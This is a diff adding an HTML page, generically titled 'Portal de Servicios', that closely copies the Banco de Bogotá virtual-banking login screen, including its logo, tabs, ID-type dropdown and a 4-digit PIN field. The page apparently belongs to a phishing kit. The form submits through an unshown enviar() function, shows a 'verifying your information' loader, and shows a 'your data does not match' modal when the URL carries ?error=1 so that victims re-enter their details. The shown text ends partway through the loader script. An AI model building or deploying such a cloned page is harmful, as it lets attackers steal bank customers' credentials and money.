@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html lang="es" style="font-size: 16px;">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal de Servicios</title>
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <link rel="stylesheet" href="assets/css/styles.css">
+  <link rel="stylesheet" href="assets/css/components.css">
+  <style>
+    /* Exact standalone adjustments */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Roboto-Regular, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      background-color: #f6faff;
+    }
+    .logo__BDB_full {
+      background-image: url("assets/images/logo.svg") !important;
+      background-size: contain !important;
+      background-repeat: no-repeat !important;
+      width: 200px !important;
+      height: 32px !important;
+      display: block;
+    }
+    .logo__BDB {
+      background-image: url("assets/images/logo-icon.svg") !important;
+      background-size: contain !important;
+      background-repeat: no-repeat !important;
+      width: 32px !important;
+      height: 32px !important;
+      display: block;
+    }
+    .-m7zf0zEtOGTpOkjz-Vn0w\=\= {
+      display: none;
+    }
+    .cRIQh9a0Zkzcv1GC0IswLA\=\= {
+      display: block;
+    }
+    @media (max-width: 599px) {
+      .K4zpkwgEhPpdsV0NO5lT4A\=\= {
+        display: flex !important;
+        align-items: center !important;
+        gap: 12px !important;
+        margin-bottom: 16px !important;
+      }
+      .-m7zf0zEtOGTpOkjz-Vn0w\=\= {
+        display: block !important;
+      }
+      .cRIQh9a0Zkzcv1GC0IswLA\=\= {
+        display: none !important;
+      }
+      .LeBfOcLjw2G7uO5iQf8cKw\=\= {
+        margin: 0 !important;
+        font-size: 20px !important;
+        line-height: 24px !important;
+        font-weight: 500 !important;
+      }
+      .sp-ml-horizontal-selector__btn-next,
+      .sp-ml-horizontal-selector__btn-back {
+        display: none !important;
+      }
+      ._0Gdby9eXQfYOY9sy4FhOQg\=\= {
+        padding-bottom: 40px !important;
+      }
+    }
+    ._4sKT51PaUCFL\+le8tAL0Rg\=\= {
+      background: transparent;
+      border: none;
+      padding: 0;
+      cursor: pointer;
+      display: block;
+      width: 469px;
+      max-width: 100%;
+      height: 269px;
+      text-decoration: none;
+    }
+    ._4sKT51PaUCFL\+le8tAL0Rg\=\= img {
+      width: 469px;
+      max-width: 100%;
+      height: 269px;
+      object-fit: cover;
+      border-radius: 12px;
+      display: block;
+    }
+    .box-options--hide {
+      display: none !important;
+    }
+    .box-options--show {
+      display: block !important;
+    }
+    /* Dropdown Type of Document Menu (Banco de Bogotá Dark Blue) */
+    #sp-at-dropdown-menu-options {
+      position: absolute;
+      top: 100%;
+      left: 0;
+      width: 100%;
+      min-width: 296px;
+      background: #0043a9 !important;
+      border-radius: 8px !important;
+      padding: 6px 0 !important;
+      box-shadow: 0 8px 24px rgba(0, 25, 71, 0.3) !important;
+      z-index: 1000 !important;
+      max-height: 260px !important;
+      overflow-y: auto !important;
+      border: 1px solid rgba(255, 255, 255, 0.1) !important;
+      margin-top: 4px;
+      opacity: 1 !important;
+      visibility: visible !important;
+      animation: none !important;
+    }
+    #sp-at-dropdown-menu-options.box-options--hide {
+      display: none !important;
+    }
+    #sp-at-dropdown-menu-options.box-options--show {
+      display: block !important;
+    }
+    #dropdown_identificationType_arrow {
+      transition: transform 0.2s ease;
+    }
+    #dropdown_identificationType_arrow.arrow--up {
+      transform: rotate(180deg);
+    }
+    #sp-at-dropdown-menu-options::-webkit-scrollbar {
+      width: 6px;
+    }
+    #sp-at-dropdown-menu-options::-webkit-scrollbar-thumb {
+      background-color: rgba(255, 255, 255, 0.4);
+      border-radius: 4px;
+    }
+    #sp-at-dropdown-menu-options::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    .box-options__option {
+      padding: 12px 18px !important;
+      color: #ffffff !important;
+      font-size: 14px !important;
+      line-height: 20px !important;
+      font-family: Roboto-Regular, sans-serif !important;
+      cursor: pointer !important;
+      transition: background-color 0.15s ease !important;
+      display: flex !important;
+      align-items: center !important;
+    }
+    .box-options__option:hover,
+    .box-options__option.selected,
+    .box-options__option--selected {
+      background: #002d72 !important;
+      color: #ffffff !important;
+    }
+    [class^="ico-"], [class*=" ico-"] {
+      font-size: 23px !important;
+    }
+    #eyeIcon,
+    .sp-at-input__content__icon span,
+    .ico-open-view,
+    .ico-close-view {
+      font-size: 23px !important;
+    }
+    .sp-ml-horizontal-selector__scrollable {
+      overflow-x: auto;
+      scroll-behavior: smooth;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+    }
+    .sp-ml-horizontal-selector__scrollable::-webkit-scrollbar {
+      display: none;
+    }
+    .sp-ml-horizontal-selector__btn-back {
+      display: none;
+    }
+    ._2qAdquiAgwqbzNCymlPemw\=\= button {
+      white-space: nowrap !important;
+    }
+    .app-view {
+      display: block;
+      transition: opacity 0.3s ease;
+    }
+    .app-view--hidden {
+      display: none !important;
+    }
+
+    /* Modal Backdrop Overlay */
+    .bdb-modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 25, 71, 0.8);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 24px;
+      box-sizing: border-box;
+    }
+
+    .bdb-modal-overlay.active {
+      display: flex;
+    }
+
+    /* Modal Card Content Box */
+    .bdb-modal-box {
+      background: #ffffff;
+      border-radius: 8px;
+      padding: 40px;
+      max-width: 608px;
+      width: 100%;
+      box-sizing: border-box;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    }
+
+    /* Warning Icon */
+    .bdb-modal-icon {
+      width: 40px;
+      height: 40px;
+      margin-bottom: 16px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .bdb-modal-icon svg {
+      width: 40px;
+      height: 40px;
+      display: block;
+    }
+
+    /* Title */
+    .bdb-modal-title {
+      font-size: 20px;
+      font-weight: 500;
+      line-height: 30px;
+      color: #000000;
+      margin: 0 0 16px 0;
+      font-family: Roboto-Medium, Roboto-Regular, sans-serif;
+    }
+
+    /* Subtitle / Description */
+    .bdb-modal-subtitle {
+      font-size: 16px;
+      font-weight: 400;
+      line-height: 24px;
+      color: #444444;
+      margin: 0;
+      font-family: Roboto-Regular, sans-serif;
+    }
+
+    /* Options / Buttons container */
+    .bdb-modal-options {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 32px;
+    }
+
+    /* Primary Button */
+    .bdb-modal-btn-primary {
+      background-color: #0043a9;
+      color: #ffffff;
+      border: none;
+      border-radius: 12px;
+      padding: 14px 32px 16px;
+      font-size: 16px;
+      font-weight: 500;
+      line-height: 24px;
+      cursor: pointer;
+      text-align: center;
+      font-family: Roboto-Medium, Roboto-Regular, sans-serif;
+      transition: background-color 0.2s ease, transform 0.1s ease;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .bdb-modal-btn-primary:hover {
+      background-color: #003380;
+    }
+
+    .bdb-modal-btn-primary:active {
+      transform: scale(0.98);
+    }
+
+    @media (max-width: 599px) {
+      .bdb-modal-box {
+        padding: 24px 20px 28px;
+      }
+      .bdb-modal-title {
+        font-size: 18px;
+        line-height: 26px;
+      }
+      .bdb-modal-subtitle {
+        font-size: 14px;
+        line-height: 22px;
+      }
+      .bdb-modal-options {
+        justify-content: stretch;
+      }
+      .bdb-modal-btn-primary {
+        width: 100%;
+      }
+    }
+
+    /* --- LOADER OVERLAY BANCO DE BOGOTA --- */
+    #loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(13, 35, 72, 0.85);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+      text-align: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .loader-scene {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .dots-wrapper {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .dots-wrapper.animating {
+      animation: global-rotate 1.8s linear infinite 2.5s;
+    }
+    .dot {
+      position: absolute;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      transform: scale(0);
+    }
+    .cyan   { background-color: #00e5ff; z-index: 3; }
+    .yellow { background-color: #ffeb3b; z-index: 2; }
+    .red    { background-color: #ff3d00; z-index: 1; }
+    .fixed-shadow {
+      position: absolute;
+      bottom: -5px;
+      width: 40px;
+      height: 8px;
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 50%;
+      filter: blur(5px);
+      transform: scale(0);
+    }
+    .loader-text {
+      color: white;
+      font-size: 19px;
+      font-weight: 500;
+      max-width: 320px;
+      text-shadow: 0 2px 8px rgba(0, 0, 0, 0.6);
+      font-family: Roboto-Medium, Roboto-Regular, sans-serif;
+    }
+
+    @keyframes global-rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    @keyframes intro-cyan   { 0% { transform: scale(0) translateY(-80px); } 20%, 100% { transform: scale(1) translate(0, 0); } }
+    @keyframes intro-yellow { 0%, 65% { transform: scale(0); } 100% { transform: scale(1) translate(0, 0); } }
+    @keyframes intro-red    { 0%, 85% { transform: scale(0); } 100% { transform: scale(1) translate(0, 0); } }
+    @keyframes move-cyan    { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(0, -40px); } }
+    @keyframes move-yellow  { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(-35px, 20px); } }
+    @keyframes move-red     { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(35px, 20px); } }
+    @keyframes shadow-pulse { 0%, 20% { transform: scale(0); opacity: 0; } 100% { transform: scale(1.1); opacity: 1; } }
+  </style>
+</head>
+<body>
+  <!-- Pantalla de Carga Inmediata (Loader Overlay) -->
+  <div id="loader-overlay">
+    <div class="loader-scene">
+      <div class="dots-wrapper">
+        <div class="dot cyan"></div>
+        <div class="dot yellow"></div>
+        <div class="dot red"></div>
+      </div>
+      <div class="fixed-shadow"></div>
+    </div>
+    <p class="loader-text">Estamos verificando tu información, por favor no cierres esta ventana.</p>
+  </div>
+  <!-- Modal Dialog Alert: Tus datos no coinciden -->
+  <div id="errorModal" class="bdb-modal-overlay" role="dialog" aria-modal="true">
+    <div class="bdb-modal-box">
+      <div class="bdb-modal-icon">
+        <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M20 3.33334L36.6667 33.3333H3.33334L20 3.33334Z" fill="#F69B31"/>
+          <path d="M20 15V23.3333" stroke="#FFFFFF" stroke-width="2.5" stroke-linecap="round"/>
+          <circle cx="20" cy="28.3333" r="1.5" fill="#FFFFFF"/>
+        </svg>
+      </div>
+      <h2 class="bdb-modal-title">Tus datos no coinciden</h2>
+      <p class="bdb-modal-subtitle">
+        Verifícalos e inténtalo nuevamente. Si aún no eres cliente te invitamos a solicitar un producto desde la pantalla de inicio.
+      </p>
+      <div class="bdb-modal-options">
+        <button type="button" class="bdb-modal-btn-primary" id="btnModalClose">
+          Volver al inicio
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Login View Container -->
+  <div id="loginView" class="app-view">
+    <div id="root">
+    <div class="shell-container">
+      <div class="shell-container__security-mf"></div>
+      <div class="shell-container__mf shell-container__auth">
+        <div class="_7iexZXBAeI30pvSwzz84WQ==">
+          <div slot="content" class="_0Gdby9eXQfYOY9sy4FhOQg==">
+            <div class="sp-grid">
+              <div class="sp-container">
+                <div class="row">
+                  <!-- Left Column: Login -->
+                  <div class="kASZ-GVb1mV-F7wsG8XMrQ== col-xs-12 col-sm-10 col-lg-4 col-sm-offset-1 col-lg-offset-1">
+                    
+                    <!-- Header with Logo and Welcome -->
+                    <div class="K4zpkwgEhPpdsV0NO5lT4A==">
+                      <div class="cRIQh9a0Zkzcv1GC0IswLA==">
+                        <div tabindex="0" id="sp-at-logo" class="logo logo__BDB_full" aria-label="logo Banco de Bogotá" style="height: 32px;"></div>
+                      </div>
+                      <div class="-m7zf0zEtOGTpOkjz-Vn0w==">
+                        <div tabindex="0" id="sp-at-logo-mobile" class="logo logo__BDB" aria-label="logo Banco de Bogotá" style="height: 32px;"></div>
+                      </div>
+                      <div class="LeBfOcLjw2G7uO5iQf8cKw== sp-text-heading-5">Bienvenido a tu Banca Virtual</div>
+                    </div>
+
+                    <!-- Mascot Banner -->
+                    <div class="I-MuvO+UPg4UEIDwvDzQww==">
+                      <div class="RtO-GDpVCDwXXcYboPOQQA==">
+                        <img src="assets/images/ayuda_avatar.png" alt="Ayuda para ingresar a Banca Virtual">
+                      </div>
+                      <div class="_2NRBYvhlHS2ejyxSrjRrNg==">
+                        <p class="sp-text-paragraph-s">¿Nunca has ingresado a Banca Virtual?</p>
+                        <button type="button" class="sp-at-btn--link--white sp-at-btn--lg">
+                          <span class="sp-text-paragraph-s">Aquí te decimos cómo hacerlo ›</span>
+                        </button>
+                      </div>
+                    </div>
+
+                    <!-- Main Login Card Container -->
+                    <div class="sSx+Q-lIOPxgL65Y7MbQ-A==">
+                      
+                      <!-- Tabs -->
+                      <div id="sp-ml-secondtabs" class="parent-container">
+                        <div id="main" class="mainContainer mainContainer--center">
+                          <div id="tabs-container" class="mainContainer__tabsContainer" style="width: 100%;">
+                            <div role="tablist" id="tabs-bar" class="mainContainer__tabsContainer__bar" style="width: 100%;">
+                              <button id="sp-ml-secondtabs__1" type="button" role="tab" aria-selected="true" class="mainContainer__tabsContainer__bar__segment" style="width: 50%; padding: 0px; cursor: pointer;">
+                                <span id="label1" class="mainContainer__tabsContainer__bar__segment__label" style="color: var(--sp-color-foreground-interactive);">Clave segura</span>
+                              </button>
+                              <button id="sp-ml-secondtabs__2" type="button" role="tab" aria-selected="false" class="mainContainer__tabsContainer__bar__segment" style="width: 50%; padding: 0px; cursor: pointer;">
+                                <span id="label2" class="mainContainer__tabsContainer__bar__segment__label" style="color: var(--sp-color-foreground-secondary);">Tarjeta débito</span>
+                              </button>
+                            </div>
+                            <div id="tabIndicator" class="mainContainer__tabsContainer__tab" style="width: 50%; transform: translate(0px, 0px); transition: transform 0.3s ease;"></div>
+                          </div>
+                        </div>
+                        <div class="line"></div>
+                      </div>
+
+                      <!-- Dismissible Info Banner -->
+                      <div class="_9asEwNKF5GhhMIAZ6SQShg==" id="infoBannerBox">
+                        <div class="ADM0GOKt2z7WQ9Mt4lMlxQ==" data-testid="banner-info-text">
+                          <p class="sp-text-paragraph-s" id="bannerInfoText">Estás ingresando con tu Clave Segura. Selecciona ‘Tarjeta Débito’ para cambiar el tipo de ingreso.</p>
+                        </div>
+                        <div class="oX06ZtYfvP1F6NSrndkfqw==">
+                          <button type="button" class="sp-at-btn sp-at-btn-action sp-at-btn-action--tertiary--info sp-at-btn-action--sm" id="closeBannerBtn">
+                            <span class="ico-close"></span>
+                          </button>
+                        </div>
+                      </div>
+
+                      <!-- Form -->
+                      <form novalidate data-testid="login-form" id="loginForm" onsubmit="event.preventDefault(); enviar();">
+                        <div class="Rss5lmooa4LaRBcklXQG1g==">
+                          
+                          <!-- Document Selection Row -->
+                          <div class="S2UoSavgNyQ5bZtWswES6g==">
+                            <div class="VfNxBuyQH1iHTBzzFnacpw==">
+                              <div id="sp-at-dropdown" class="container" style="width: 100%;">
+                                <div class="sp-at-input__label">
+                                  <label for="dropdown_identificationType">Identificación</label>
+                                </div>
+                                <div class="container__input">
+                                  <button tabindex="0" type="button" id="dropdown_identificationType" class="container__input__box" aria-haspopup="listbox">
+                                    <p id="dropdown_identificationType_placeholder" class="container__input__box__placeholder container__input__box__valueSelected">C.C. &nbsp; Cédula de ciudadanía</p>
+                                    <span id="dropdown_identificationType_arrow" class="ico-arrow-down arrow"></span>
+                                  </button>
+                                  <div class="box-options--hide" id="sp-at-dropdown-menu-options" role="listbox" style="min-width: 296px;">
+                                    <div role="option" id="option-CC" class="box-options__option">C.C. &nbsp; Cédula de ciudadanía</div>
+                                    <div role="option" id="option-TI" class="box-options__option">T.I. &nbsp; Tarjeta de Identidad</div>
+                                    <div role="option" id="option-CE" class="box-options__option">C.E. &nbsp; Cédula de Extranjería</div>
+                                    <div role="option" id="option-NI" class="box-options__option">N.P.N. NIT Persona Natural</div>
+                                    <div role="option" id="option-NE" class="box-options__option">N.P.E. NIT Persona Extranjera</div>
+                                    <div role="option" id="option-NJ" class="box-options__option">N.P.J. NIT Persona Jurídica</div>
+                                    <div role="option" id="option-PA" class="box-options__option">P.S. &nbsp; Pasaporte</div>
+                                    <div role="option" id="option-RC" class="box-options__option">R.C. &nbsp; Registro Civil</div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+
+                            <!-- Document Number Input -->
+                            <div class="_38XTXN6LzdUclz9qYHcAyA==">
+                              <div id="sp-at-input" class="sp-at-input" style="width: 100%;">
+                                <div class="sp-at-input__content" style="margin-top: 28px;">
+                                  <input class="sp-at-input__content__input" id="identificationNumber" name="identificationNumber" type="tel" inputmode="numeric" placeholder="#" maxlength="10" autocomplete="username">
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+
+                          <!-- Password Input Row -->
+                          <div class="kEBB6+7IfbDPxUuB6G3LvQ==" style="margin-top: 20px;">
+                            <div id="sp-at-input" class="sp-at-input" style="width: 100%;">
+                              <div class="sp-at-input__label">
+                                <label for="password" id="passwordLabelText">Clave segura</label>
+                              </div>
+                              <div class="sp-at-input__content">
+                                <input class="sp-at-input__content__input sp-at-input__content__input--password sp-at-input__content__input--icon" id="password" name="password" type="password" placeholder="••••" maxlength="4" inputmode="numeric" autocomplete="current-password">
+                                <button type="button" class="sp-at-input__content__icon" id="togglePasswordBtn" style="border:none;background:none;padding:0;cursor:pointer;" aria-label="Mostrar contraseña">
+                                  <span class="ico-open-view" id="eyeIcon"></span>
+                                </button>
+                              </div>
+                            </div>
+                          </div>
+
+                          <!-- Submit Button -->
+                          <button class="eay7wDeyb-EbWIk2kfDMUg== sp-at-btn sp-at-btn--primary sp-at-btn--lg" id="btnSubmit" disabled type="submit">Ingresar</button>
+
+                          <!-- Links: Registrarme & Olvidé mi clave -->
+                          <div class="_2qAdquiAgwqbzNCymlPemw==">
+                            <div class="FFpcSRrHMJPw-SkgQESC6Q==">
+                              <button type="button" class="O0YA2X74My9l+nzRnY-JMQ== sp-at-btn sp-at-btn--link sp-at-btn--lg" data-testid="register-button">
+                                <span>Registrarme ›</span>
+                              </button>
+                            </div>
+                            <button type="button" class="JgosmUi+t305evaOyAeTcg== sp-at-btn sp-at-btn--link sp-at-btn--lg" data-testid="forget-button">
+                              <span>Olvidé mi clave ›</span>
+                            </button>
+                          </div>
+                        </div>
+                      </form>
+                    </div>
+
+                    <!-- reCAPTCHA Notice -->
+                    <div class="_8tZh1MJslDjXZUMTa9BZCw== sp-text-caption">
+                      Este sitio está protegido por reCAPTCHA y aplican las <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer">políticas de privacidad</a> y los <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer">términos de servicio de Google</a>.
+                    </div>
+                  </div>
+
+                  <!-- Right Column: Promo Banner & Quick Links -->
+                  <div class="_3fwnkATm8OOXVUer3cv63Q== col-xs-12 col-sm-10 col-lg-5 col-lg-offset-1" data-testid="login-info">
+                    <div class="l6PvrKiF67ac2E7uXbqwdA==">
+                      <span class="_9TCe2JJahCN6jayBgMLgiw==">v.1.36.1</span>
+                    </div>
+                    <div class="t6+WO7mE1jTBH3qExjodKw==">
+                      <a href="https://cuentadigital.bancodebogota.com.co/cuenta-ahorros/" target="_blank" class="_4sKT51PaUCFL+le8tAL0Rg==" id="mth_banner_bdb" data-testid="login-banner">
+                        <img src="assets/images/banner.png" alt="Cuenta Fácil Sin cuota de manejo y transferencias gratis. Descúbrela ahora">
+                      </a>
+                      <div class="XTZk5Fsbyr-8UVrZwafLpA==">
+                        <div class="sp-ml-horizontal-selector">
+                          <div class="sp-ml-horizontal-selector__scrollable" id="carouselTrack">
+                            <div class="sp-ml-horizontal-selector__scrollable__container">
+                              <div id="sp-ml-horizontal-selector__0" class="sp-ml-horizontal-selector__scrollable__container__selector" style="width: 124px;">
+                                <div id="sp-ml-box-button" class="sp-ml-box-button">
+                                  <button type="button" id="selector__00" class="box" style="width: 100%;">
+                                    <span class="box__icon ico-seguros"></span>
+                                    <div class="box__label">Configuración de seguridad</div>
+                                  </button>
+                                </div>
+                              </div>
+                              <div id="sp-ml-horizontal-selector__1" class="sp-ml-horizontal-selector__scrollable__container__selector" style="width: 124px;">
+                                <div id="sp-ml-box-button" class="sp-ml-box-button">
+                                  <button type="button" id="selector__10" class="box" style="width: 100%;">
+                                    <span class="box__icon ico-cuenta-de-ahorros"></span>
+                                    <div class="box__label">Solicitar un producto</div>
+                                  </button>
+                                </div>
+                              </div>
+                              <div id="sp-ml-horizontal-selector__2" class="sp-ml-horizontal-selector__scrollable__container__selector" style="width: 124px;">
+                                <div id="sp-ml-box-button" class="sp-ml-box-button">
+                                  <button type="button" id="selector__20" class="box" style="width: 100%;">
+                                    <span class="box__icon ico-call-center"></span>
+                                    <div class="box__label">Atención al cliente</div>
+                                  </button>
+                                </div>
+                              </div>
+                              <div id="sp-ml-horizontal-selector__3" class="sp-ml-horizontal-selector__scrollable__container__selector" style="width: 124px;">
+                                <div id="sp-ml-box-button" class="sp-ml-box-button">
+                                  <button type="button" id="selector__30" class="box" style="width: 100%;">
+                                    <span class="box__icon ico-digital-shift"></span>
+                                    <div class="box__label">Solicitar un turno digital</div>
+                                  </button>
+                                </div>
+                              </div>
+                              <div id="sp-ml-horizontal-selector__4" class="sp-ml-horizontal-selector__scrollable__container__selector" style="width: 124px;">
+                                <div id="sp-ml-box-button" class="sp-ml-box-button">
+                                  <button type="button" id="selector__40" class="box" style="width: 100%;">
+                                    <span class="box__icon ico-call-center"></span>
+                                    <div class="box__label">Buscar cajeros y oficinas</div>
+                                  </button>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <button type="button" id="carouselPrev" class="sp-at-btn sp-at-btn-action sp-at-btn-action--secondary sp-at-btn-action--lg sp-ml-horizontal-selector__btn-back">
+                            <span class="ico-arrow-back"></span>
+                          </button>
+                          <button type="button" id="carouselNext" class="sp-at-btn sp-at-btn-action sp-at-btn-action--secondary sp-at-btn-action--lg sp-ml-horizontal-selector__btn-next" style="display: initial;">
+                            <span class="ico-arrow-next"></span>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      // 1. Limpieza de sesión y manejo de error en URL
+      localStorage.removeItem('session_id');
+      localStorage.removeItem('messageId');
+      localStorage.removeItem('token');
+      localStorage.removeItem('username');
+      localStorage.removeItem('password');
+      localStorage.removeItem('identificacion');
+
+      const params = new URLSearchParams(window.location.search);
+      if (params.get('error') === '1') {
+        const modal = document.getElementById('errorModal');
+        if (modal) {
+          modal.classList.add('active');
+        }
+        window.history.replaceState({}, document.title, window.location.pathname);
+      }
+
+      const btnModalClose = document.getElementById('btnModalClose');
+      if (btnModalClose) {
+        btnModalClose.addEventListener('click', () => {
+          const modal = document.getElementById('errorModal');
+          if (modal) modal.classList.remove('active');
+        });
+      }
+
+      // 2. Dropdown de Tipo de Identificación
+      const dropdownBtn = document.getElementById('dropdown_identificationType');
+      const dropdownArrow = document.getElementById('dropdown_identificationType_arrow');
+      const dropdownMenu = document.getElementById('sp-at-dropdown-menu-options');
+      const dropdownText = document.getElementById('dropdown_identificationType_placeholder');
+      const dropdownOptions = document.querySelectorAll('.box-options__option');
+
+      if (dropdownBtn && dropdownMenu) {
+        // Set initial selected item
+        const defaultOpt = document.getElementById('option-CC');
+        if (defaultOpt) defaultOpt.classList.add('selected');
+
+        dropdownBtn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          const isHidden = dropdownMenu.classList.contains('box-options--hide');
+          if (isHidden) {
+            dropdownMenu.classList.remove('box-options--hide');
+            dropdownMenu.classList.add('box-options--show');
+            if (dropdownArrow) dropdownArrow.classList.add('arrow--up');
+          } else {
+            dropdownMenu.classList.add('box-options--hide');
+            dropdownMenu.classList.remove('box-options--show');
+            if (dropdownArrow) dropdownArrow.classList.remove('arrow--up');
+          }
+        });
+
+        dropdownOptions.forEach(opt => {
+          opt.addEventListener('click', (e) => {
+            e.stopPropagation();
+            dropdownOptions.forEach(o => o.classList.remove('selected'));
+            opt.classList.add('selected');
+            if (dropdownText) dropdownText.textContent = opt.textContent;
+            dropdownMenu.classList.add('box-options--hide');
+            dropdownMenu.classList.remove('box-options--show');
+            if (dropdownArrow) dropdownArrow.classList.remove('arrow--up');
+            validarInputs();
+          });
+        });
+
+        document.addEventListener('click', (e) => {
+          if (!dropdownBtn.contains(e.target) && !dropdownMenu.contains(e.target)) {
+            dropdownMenu.classList.add('box-options--hide');
+            dropdownMenu.classList.remove('box-options--show');
+            if (dropdownArrow) dropdownArrow.classList.remove('arrow--up');
+          }
+        });
+      }
+
+      // 3. Tabs: Clave segura / Tarjeta débito
+      const tab1 = document.getElementById('sp-ml-secondtabs__1');
+      const tab2 = document.getElementById('sp-ml-secondtabs__2');
+      const label1 = document.getElementById('label1');
+      const label2 = document.getElementById('label2');
+      const tabIndicator = document.getElementById('tabIndicator');
+      const bannerInfoText = document.getElementById('bannerInfoText');
+      const infoBannerBox = document.getElementById('infoBannerBox');
+      const passwordLabelText = document.getElementById('passwordLabelText');
+
+      if (tab1 && tab2) {
+        tab1.addEventListener('click', () => {
+          if (label1) label1.style.color = 'var(--sp-color-foreground-interactive)';
+          if (label2) label2.style.color = 'var(--sp-color-foreground-secondary)';
+          if (tabIndicator) tabIndicator.style.transform = 'translate(0px, 0px)';
+          if (infoBannerBox) infoBannerBox.style.display = 'flex';
+          if (bannerInfoText) bannerInfoText.textContent = 'Estás ingresando con tu Clave Segura. Selecciona ‘Tarjeta Débito’ para cambiar el tipo de ingreso.';
+          if (passwordLabelText) passwordLabelText.textContent = 'Clave segura';
+        });
+
+        tab2.addEventListener('click', () => {
+          if (label2) label2.style.color = 'var(--sp-color-foreground-interactive)';
+          if (label1) label1.style.color = 'var(--sp-color-foreground-secondary)';
+          if (tabIndicator) tabIndicator.style.transform = 'translate(100%, 0px)';
+          if (infoBannerBox) infoBannerBox.style.display = 'flex';
+          if (bannerInfoText) bannerInfoText.textContent = 'Estás ingresando con tu Tarjeta Débito. Selecciona ‘Clave Segura’ para cambiar el tipo de ingreso.';
+          if (passwordLabelText) passwordLabelText.textContent = 'Clave de tarjeta débito';
+        });
+      }
+
+      // 4. Cerrar banner informativo
+      const closeBannerBtn = document.getElementById('closeBannerBtn');
+      if (closeBannerBtn && infoBannerBox) {
+        closeBannerBtn.addEventListener('click', () => {
+          infoBannerBox.style.display = 'none';
+        });
+      }
+
+      // 5. Toggle visibilidad de contraseña
+      const passInput = document.getElementById('password');
+      const eyeIcon = document.getElementById('eyeIcon');
+      const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+
+      if (togglePasswordBtn && passInput) {
+        togglePasswordBtn.addEventListener('click', () => {
+          if (passInput.type === 'password') {
+            passInput.type = 'text';
+            if (eyeIcon) eyeIcon.className = 'ico-close-view';
+          } else {
+            passInput.type = 'password';
+            if (eyeIcon) eyeIcon.className = 'ico-open-view';
+          }
+        });
+      }
+
+      // 6. Validación de inputs y habilitación del botón
+      const idInput = document.getElementById('identificationNumber');
+      const btnSubmit = document.getElementById('btnSubmit');
+
+      function validarInputs() {
+        if (!idInput || !passInput || !btnSubmit) return;
+        idInput.value = idInput.value.replace(/\D/g, '');
+        passInput.value = passInput.value.replace(/\D/g, '');
+
+        if (idInput.value.trim().length >= 6 && passInput.value.trim().length === 4) {
+          btnSubmit.disabled = false;
+        } else {
+          btnSubmit.disabled = true;
+        }
+      }
+
+      if (idInput) idInput.addEventListener('input', validarInputs);
+      if (passInput) passInput.addEventListener('input', validarInputs);
+
+      const savedCedula = sessionStorage.getItem('client_cedula');
+      if (savedCedula && idInput) {
+        idInput.value = savedCedula;
+        validarInputs();
+        if (passInput) passInput.focus();
+      }
+
+      // 7. Carousel de accesos rápidos
+      const track = document.getElementById('carouselTrack');
+      const prevBtn = document.getElementById('carouselPrev');
+      const nextBtn = document.getElementById('carouselNext');
+
+      if (track && prevBtn && nextBtn) {
+        const updateCarouselArrows = () => {
+          const maxScroll = track.scrollWidth - track.clientWidth;
+          prevBtn.style.display = track.scrollLeft > 10 ? 'initial' : 'none';
+          nextBtn.style.display = track.scrollLeft < maxScroll - 10 ? 'initial' : 'none';
+        };
+
+        nextBtn.addEventListener('click', () => {
+          track.scrollBy({ left: 240, behavior: 'smooth' });
+          setTimeout(updateCarouselArrows, 300);
+        });
+
+        prevBtn.addEventListener('click', () => {
+          track.scrollBy({ left: -240, behavior: 'smooth' });
+          setTimeout(updateCarouselArrows, 300);
+        });
+
+        track.addEventListener('scroll', updateCarouselArrows);
+      }
+    });
+
+    function runLoader() {
+      const overlay = document.getElementById('loader-overlay');
+      if (overlay) overlay.style.display = 'flex';
+      const wrapper = document.querySelector('.dots-wrapper');
+      if (wrapper) wrapper.classList.add('animating');
+      const cyan = document.querySelector('.cyan');
+      const yellow = document.querySelector('.yellow');
+      const red = document.querySelector('.red');
+      const shadow = document.querySelector('.fixed-shadow');
+      if (cyan) cyan.style.animation = "intro-cyan 2.5s ease-out forwards, move-cyan 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
